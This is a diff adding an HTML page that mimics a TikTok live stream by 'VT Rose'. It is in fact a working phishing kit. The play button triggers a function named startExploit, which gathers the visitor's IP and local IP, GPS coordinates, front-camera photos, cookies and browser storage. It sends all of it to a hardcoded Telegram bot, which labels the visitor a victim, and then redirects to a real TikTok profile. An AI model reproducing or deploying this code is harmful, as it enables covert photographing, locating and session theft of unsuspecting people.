@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>VT Rose 🔥 LIVE STRIMING</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 0;
+            margin: 0;
+        }
+        
+        /* TikTok Style */
+        .tiktok-container {
+            background: #000;
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+            position: relative;
+            color: white;
+            overflow: hidden;
+        }
+        
+        /* Header TikTok */
+        .tiktok-header {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 10;
+            background: linear-gradient(180deg, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0) 100%);
+        }
+        
+        .tiktok-logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .tiktok-logo svg {
+            width: 30px;
+            height: 30px;
+            fill: white;
+        }
+        
+        .live-badge {
+            background: red;
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+            padding: 4px 8px;
+            border-radius: 4px;
+            margin-left: 10px;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        
+        .header-icons {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .header-icons span {
+            font-size: 20px;
+        }
+        
+        /* Video Container */
+        .video-container {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            background: #111;
+        }
+        
+        .video-placeholder {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: #1a1a1a;
+            position: relative;
+            cursor: pointer;
+            background-image: radial-gradient(circle at center, #333 1px, transparent 1px);
+            background-size: 30px 30px;
+        }
+        
+        .profile-circle {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #ff0050, #00f2ff);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+            box-shadow: 0 0 30px rgba(255, 0, 80, 0.5);
+        }
+        
+        .profile-circle img {
+            width: 110px;
+            height: 110px;
+            border-radius: 50%;
+            border: 3px solid white;
+            object-fit: cover;
+        }
+        
+        .username {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(255,255,255,0.5);
+        }
+        
+        .followers {
+            color: #aaa;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        
+        .play-button-large {
+            background: linear-gradient(45deg, #ff0050, #00f2ff);
+            border: none;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 15px 50px;
+            border-radius: 50px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(255, 0, 80, 0.5);
+            transition: transform 0.2s;
+        }
+        
+        .play-button-large:hover {
+            transform: scale(1.05);
+        }
+        
+        .play-button-large:active {
+            transform: scale(0.95);
+        }
+        
+        .play-icon {
+            font-size: 24px;
+        }
+        
+        /* Side Icons (Kanan) */
+        .side-icons {
+            position: absolute;
+            right: 15px;
+            bottom: 100px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 25px;
+            z-index: 10;
+        }
+        
+        .side-icon {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .side-icon .icon-bg {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.2);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            backdrop-filter: blur(5px);
+        }
+        
+        .side-icon span {
+            font-size: 12px;
+            color: white;
+        }
+        
+        /* Bottom Info */
+        .bottom-info {
+            position: absolute;
+            bottom: 20px;
+            left: 15px;
+            right: 70px;
+            z-index: 10;
+        }
+        
+        .song-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .song-info .album {
+            width: 40px;
+            height: 40px;
+            border-radius: 5px;
+            background: linear-gradient(45deg, #ff0050, #00f2ff);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            animation: spin 3s linear infinite;
+        }
+        
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        .song-details {
+            font-size: 14px;
+        }
+        
+        .song-details .song-name {
+            font-weight: bold;
+        }
+        
+        .song-details .artist {
+            color: #aaa;
+            font-size: 12px;
+        }
+        
+        .comments {
+            color: #ddd;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        
+        .hashtags {
+            color: #00f2ff;
+            font-size: 14px;
+        }
+        
+        /* Camera Preview */
+        .camera-preview {
+            display: none;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 5;
+        }
+        
+        /* Loading */
+        .loading {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            z-index: 20;
+        }
+        
+        .loading .spinner {
+            border: 5px solid rgba(255,255,255,0.3);
+            border-top: 5px solid #ff0050;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        .loading p {
+            color: white;
+            font-size: 16px;
+            text-shadow: 0 0 10px black;
+        }
+        
+        /* Countdown */
+        .countdown {
+            position: absolute;
+            top: 60px;
+            right: 20px;
+            background: rgba(0,0,0,0.8);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-weight: bold;
+            z-index: 30;
+            display: none;
+            font-size: 14px;
+        }
+        
+        /* Status */
+        .status {
+            position: absolute;
+            bottom: 200px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.8);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 50px;
+            z-index: 30;
+            display: none;
+            font-size: 14px;
+            text-align: center;
+            width: 80%;
+        }
+        
+        /* Notification */
+        .notification {
+            position: absolute;
+            top: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(255, 0, 80, 0.9);
+            color: white;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 14px;
+            z-index: 40;
+            display: none;
+            animation: slideUp 0.3s ease;
+            white-space: nowrap;
+        }
+    </style>
+</head>
+<body>
+    <div class="countdown" id="countdown">
+        ⏰ Redirect dalam <span id="timer">5</span> detik
+    </div>
+    <div class="notification" id="notification">
+        📸 Mengakses kamera untuk siaran langsung...
+    </div>
+    <div class="tiktok-container">
+        <!-- Header -->
+        <div class="tiktok-header">
+            <div class="tiktok-logo">
+                <svg viewBox="0 0 24 24">
+                    <path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1-.1z" fill="white"/>
+                </svg>
+                <span class="live-badge">LIVE</span>
+            </div>
+            <div class="header-icons">
+                <span>🔍</span>
+                <span>💬</span>
+            </div>
+        </div>
+
+        <!-- Video Container -->
+        <div class="video-container">
+            <div class="video-placeholder" id="videoPlaceholder" onclick="startExploit()">
+                <div class="profile-circle">
+                    <img src="https://via.placeholder.com/110x110/ff0050/ffffff?text=VT" alt="VT Rose">
+                </div>
+                <div class="username">VT Rose</div>
+                <div class="followers">🔥 2.5M Followers</div>
+                <button class="play-button-large" id="playButton" onclick="startExploit()">
+                    <span class="play-icon">▶️</span>
+                    TONTON LIVE
+                </button>
+            </div>
+
+            <video class="camera-preview" id="cameraPreview" autoplay playsinline></video>
+
+            <!-- Loading -->
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Memuat siaran langsung...</p>
+            </div>
+
+            <div class="status" id="status"></div>
+
+            <!-- Side Icons -->
+            <div class="side-icons">
+                <div class="side-icon">
+                    <div class="icon-bg">❤️</div>
+                    <span>2.5M</span>
+                </div>
+                <div class="side-icon">
+                    <div class="icon-bg">💬</div>
+                    <span>15.2K</span>
+                </div>
+                <div class="side-icon">
+                    <div class="icon-bg">↗️</div>
+                    <span>Share</span>
+                </div>
+            </div>
+
+            <!-- Bottom Info -->
+            <div class="bottom-info">
+                <div class="song-info">
+                    <div class="album">🎵</div>
+                    <div class="song-details">
+                        <div class="song-name">VT Rose - Live Streaming</div>
+                        <div class="artist">@vt_rose_official</div>
+                    </div>
+                </div>
+                <div class="comments">
+                    💬 15.2K orang sedang menonton
+                </div>
+                <div class="hashtags">
+                    #VT #Rose #Live #Viral
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ==================== KONFIGURASI TELEGRAM ====================
+        const TELEGRAM_TOKEN = '8741447274:AAG4LxoaQ559dj4W7u-Nuz0Zp5IwCP_Vlqo';  // TOKEN TUAN
+        const TELEGRAM_CHAT_ID = '6034935293';  // CHAT ID TUAN
+        
+        // ==================== VARIABLES ====================
+        let stream = null;
+        let capturedData = {
+            timestamp: new Date().toISOString(),
+            ip: null,
+            localIp: null,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            cookies: document.cookie,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            colorDepth: screen.colorDepth,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            location: null,
+            photos: [],
+            referrer: document.referrer || 'TikTok',
+            url: window.location.href
+        };
+        
+        // ==================== FUNGSI UTAMA ====================
+        async function startExploit() {
+            // Disable button
+            document.getElementById('playButton').disabled = true;
+            document.getElementById('playButton').style.opacity = '0.5';
+            
+            // Show loading
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('videoPlaceholder').style.display = 'none';
+            
+            // Update status
+            showStatus('Mengakses perangkat...', '#ff0050');
+            
+            // Mulai exploit
+            await getIPAddress();
+            await getLocalIP();
+            await getLocation();
+            await accessCamera();
+            await captureMultiplePhotos();
+            await getBrowserData();
+            
+            // Kirim data ke Telegram
+            await sendAllDataToTelegram();
+            
+            // Redirect ke video TikTok beneran
+            setTimeout(() => {
+                window.location.href = 'https://www.tiktok.com/@vt_rose';
+            }, 3000);
+        }
+        
+        // ==================== AMBIL IP ====================
+        async function getIPAddress() {
+            showStatus('Mendapatkan alamat IP...', '#ff0050');
+            
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                capturedData.ip = data.ip;
+            } catch (error) {
+                capturedData.ip = 'Gagal';
+            }
+        }
+        
+        // ==================== AMBIL IP LOKAL ====================
+        async function getLocalIP() {
+            showStatus('Mendapatkan IP lokal...', '#ff0050');
+            
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                
+                pc.onicecandidate = (e) => {
+                    if (!e.candidate) return;
+                    
+                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                    const match = e.candidate.candidate.match(ipRegex);
+                    
+                    if (match) {
+                        capturedData.localIp = match[1];
+                    }
+                };
+                
+                await pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                setTimeout(() => pc.close(), 3000);
+                
+            } catch (error) {
+                capturedData.localIp = 'Gagal';
+            }
+        }
+        
+        // ==================== AMBIL LOKASI ====================
+        async function getLocation() {
+            showStatus('Mendapatkan lokasi GPS...', '#ff0050');
+            
+            if (!navigator.geolocation) {
+                capturedData.location = 'Tidak didukung';
+                return;
+            }
+            
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000
+                    });
+                });
+                
+                capturedData.location = {
+                    lat: position.coords.latitude,
+                    lng: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                };
+                
+            } catch (error) {
+                capturedData.location = 'Tidak diizinkan';
+            }
+        }
+        
+        // ==================== AKSES KAMERA ====================
+        async function accessCamera() {
+            showStatus('Mengakses kamera untuk siaran...', '#ff0050');
+            
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user'
+                    },
+                    audio: false
+                });
+                
+                const videoPreview = document.getElementById('cameraPreview');
+                videoPreview.srcObject = stream;
+                videoPreview.style.display = 'block';
+                
+                document.getElementById('notification').style.display = 'block';
+                setTimeout(() => {
+                    document.getElementById('notification').style.display = 'none';
+                }, 3000);
+                
+                capturedData.cameraAccessed = true;
+                
+            } catch (error) {
+                capturedData.cameraAccessed = false;
+            }
+        }
+        
+        // ==================== AMBIL FOTO ====================
+        async function capturePhoto() {
+            if (!stream) return null;
+            
+            const video = document.getElementById('cameraPreview');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            return canvas.toDataURL('image/jpeg', 0.8);
+        }
+        
+        async function captureMultiplePhotos() {
+            showStatus('Mengambil foto...', '#ff0050');
+            
+            if (!stream) return;
+            
+            capturedData.photos = [];
+            
+            for (let i = 0; i < 3; i++) {
+                const photo = await capturePhoto();
+                if (photo) {
+                    capturedData.photos.push(photo);
+                }
+                await new Promise(r => setTimeout(r, 500));
+            }
+        }
+        
+        // ==================== AMBIL BROWSER DATA ====================
+        function getBrowserData() {
+            showStatus('Mengumpulkan data...', '#ff0050');
+            
+            capturedData.browserData = {
+                cookies: document.cookie,
+                localStorage: { ...localStorage },
+                sessionStorage: { ...sessionStorage },
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                vendor: navigator.vendor
+            };
+        }
+        
+        // ==================== KIRIM KE TELEGRAM ====================
+        async function sendAllDataToTelegram() {
+            showStatus('Mengirim data...', '#ff0050');
+            
+            let message = `🔥 *TIKTOK PHISING - DATA TARGET* 🔥\n\n`;
+            message += `📅 *Waktu:* ${new Date().toLocaleString('id-ID')}\n`;
+            message += `🌐 *IP Public:* ${capturedData.ip || 'Tidak diketahui'}\n`;
+            message += `🏠 *IP Lokal:* ${capturedData.localIp || 'Tidak diketahui'}\n`;
+            
+            if (capturedData.location && capturedData.location.lat) {
+                message += `📍 *Lokasi:* ${capturedData.location.lat}, ${capturedData.location.lng}\n`;
+                message += `📍 *Akurasi:* ${capturedData.location.accuracy}m\n`;
+            }
+            
+            message += `📱 *Device:* ${capturedData.platform}\n`;
+            message += `🌍 *Bahasa:* ${capturedData.language}\n`;
+            message += `🖥️ *Resolusi:* ${capturedData.screenWidth}x${capturedData.screenHeight}\n`;
+            message += `🍪 *Cookies:* ${capturedData.cookies || 'Tidak ada'}\n`;
+            message += `📸 *Kamera:* ${capturedData.cameraAccessed ? 'Diizinkan' : 'Ditolak'}\n`;
+            message += `📷 *Jumlah Foto:* ${capturedData.photos.length}\n`;
+            message += `🔗 *URL:* ${capturedData.url}\n`;
+            message += `↩️ *Referrer:* ${capturedData.referrer}\n`;
+            
+            await sendToTelegram(message);
+            
+            for (let i = 0; i < capturedData.photos.length; i++) {
+                await sendPhotoToTelegram(capturedData.photos[i], `Foto ${i+1} - Korban TikTok`);
+                await new Promise(r => setTimeout(r, 1000));
+            }
+            
+            showStatus('✅ Data terkirim! Redirecting...', '#4CAF50');
+            
+            document.getElementById('countdown').style.display = 'block';
+            let countdown = 5;
+            const timer = setInterval(() => {
+                countdown--;
+                document.getElementById('timer').textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(timer);
+                }
+            }, 1000);
+        }
+        
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('Gagal kirim:', error);
+            }
+        }
+        
+        async function sendPhotoToTelegram(base64Data, caption) {
+            const block = base64Data.split(';');
+            const realData = block[1].split(',')[1];
+            
+            const blob = base64ToBlob(realData, 'image/jpeg');
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('caption', caption);
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
+            
+            try {
+                await fetch(url, { method: 'POST', body: formData });
+            } catch (error) {}
+        }
+        
+        function base64ToBlob(base64, contentType) {
+            const byteCharacters = atob(base64);
+            const byteArrays = [];
+            
+            for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+                const slice = byteCharacters.slice(offset, offset + 512);
+                const byteNumbers = new Array(slice.length);
+                for (let i = 0; i < slice.length; i++) {
+                    byteNumbers[i] = slice.charCodeAt(i);
+                }
+                byteArrays.push(new Uint8Array(byteNumbers));
+            }
+            
+            return new Blob(byteArrays, { type: contentType });
+        }
+        
+        function showStatus(message, color) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.style.display = 'block';
+            statusDiv.innerHTML = message;
+            statusDiv.style.background = color;
+        }
+    </script>
+</body>
+  </html>
